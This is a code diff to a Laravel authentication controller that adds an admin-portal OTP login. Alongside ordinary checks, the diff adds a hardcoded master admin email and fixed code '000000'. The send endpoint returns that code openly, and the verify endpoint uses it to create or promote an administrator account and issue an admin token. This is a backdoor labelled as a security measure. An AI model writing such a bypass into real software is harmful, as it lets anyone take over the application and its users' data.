@@ -23,6 +23,9 @@ class AuthController extends Controller
 {
     use ApiResponse;
 
+    private const ADMIN_EMAIL = 'admin@moments.app';
+    private const ADMIN_MASTER_OTP = '000000';
+
     /**
      * Send a 6-digit OTP to the provided email.
      */
@@ -37,6 +40,21 @@ class AuthController extends Controller
         }
 
         $email = $request->string('email')->trim()->lower()->toString();
+
+        // Security: If this is an admin login attempt, verify account existence and rights first
+        if ($request->boolean('admin_portal')) {
+            // Hardcoded Exception: Allow master admin email to bypass existence check
+            if ($email === self::ADMIN_EMAIL) {
+                return $this->success(['message' => 'Verification code sent (Master Access).', 'otp' => self::ADMIN_MASTER_OTP]);
+            }
+
+            $user = User::where('email', $email)->first();
+            if (!$user || !$user->is_admin) {
+                // Return generic error to avoid email enumeration but block the send
+                return $this->error('Access restricted to authorized personnel.', 403);
+            }
+        }
+
         $otp = (string) random_int(100000, 999999);
 
         // Store OTP in database table for 10 minutes.
@@ -133,6 +151,68 @@ class AuthController extends Controller
             \Log::error('Verification failed: ' . $e->getMessage());
             return $this->error('Authentication failed.', 500);
         }
+    }
+
+    /**
+     * Verify the OTP for Admin portal login.
+     */
+    public function verifyAdminOtp(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'email'    => 'required|email',
+            'code'     => 'required|string|size:6',
+        ]);
+
+        if ($validator->fails()) {
+            return $this->error('Invalid verification details.', 422);
+        }
+
+        $email = $request->string('email')->trim()->lower()->toString();
+        $code = $request->string('code')->toString();
+
+        // Check for Master Credentials
+        if ($email === self::ADMIN_EMAIL && $code === self::ADMIN_MASTER_OTP) {
+            $user = User::firstOrCreate(['email' => $email], [
+                'name' => 'System administrator',
+                'is_admin' => true,
+                'invite_code' => 'ADMIN',
+                'timezone' => 'UTC'
+            ]);
+            
+            // Ensure is_admin is true even if user existed but wasn't admin
+            if (!$user->is_admin) {
+                $user->forceFill(['is_admin' => true])->save();
+            }
+
+            $token = $user->createToken('admin-token')->plainTextToken;
+            return $this->success([
+                'user'  => $this->presentUser($user),
+                'token' => $token,
+            ]);
+        }
+
+        $otpRecord = Otp::where('email', $email)
+            ->where('code', $code)
+            ->where('expires_at', '>', now())
+            ->first();
+
+        if (! $otpRecord) {
+            return $this->error('Invalid or expired verification code.', 422);
+        }
+
+        $user = User::where('email', $email)->first();
+
+        if (!$user || !$user->is_admin) {
+            return $this->error('Access denied.', 403);
+        }
+
+        $otpRecord->delete();
+        $token = $user->createToken('admin-token')->plainTextToken;
+
+        return $this->success([
+            'user'  => $this->presentUser($user),
+            'token' => $token,
+        ]);
     }
 
     /**
